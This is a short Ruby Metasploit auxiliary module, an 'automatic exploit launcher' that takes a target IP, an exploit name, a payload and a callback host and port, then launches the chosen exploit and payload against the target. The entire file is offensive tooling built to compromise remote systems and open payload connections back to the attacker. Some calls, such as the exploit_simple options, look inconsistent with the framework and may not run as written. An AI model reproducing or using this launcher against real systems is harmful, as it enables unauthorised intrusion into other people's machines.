#!/usr/bin/env ruby

class MetasploitModule < Msf::Auxiliary

  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner

    def initialize(info = {})
        super(update_info(info,
        'Name'     => 'automatic exploit launcher',
        'Description' => %q{
            The purpose of this script is to automatically launches
            a chosen exploit against a target system.
        },
        'Author'   => [ 'Emma LATEYRON' ],
        'License'  => MSF_LICENSE))

        register_options(
            [
                OptString.new('RHOST', [true, 'Target IP address']),
                OptString.new('EXPLOIT', [true, 'Exploit module name']),
                OptString.new('PAYLOAD', [true, 'Payload name']),
                OptString.new('LHOST', [true, 'Local IP address']),
                OptInt.new('LPORT', [true, 'Local port'])
            ]
        )
    end
      
    def run
        rhost = datastore['RHOST']
        exploit_name = datastore['EXPLOIT']
        payload_name = datastore['PAYLOAD']
        lhost = datastore['LHOST']
        lport = datastore['LPORT']

        print_status("Launching exploit #{exploit_name} against #{rhost} with payload #{payload_name}")

        exploit = framework.exploits.create(exploit_name)

        if exploit.nil?
            print_error("Exploit module not found: #{exploit_name}")
            return
        end

        exploit.datastore['RHOST'] = rhost
        exploit.datastore['LHOST'] = lhost
        exploit.datastore['LPORT'] = lport
        exploit.datastore['PAYLOAD'] = payload_name

        payload = framework.payloads.create(payload_name)
        if payload.nil?
            print_error("Payload not found: #{payload_name}")
            return
        end

        payload.datastore['LHOST'] = lhost
        payload.datastore['LPORT'] = lport

        print_status("Running exploit")

        exploit.exploit_simple(
            'Payload'       => payload,
            'TargetHost'    => rhost
        )
        
    end
end
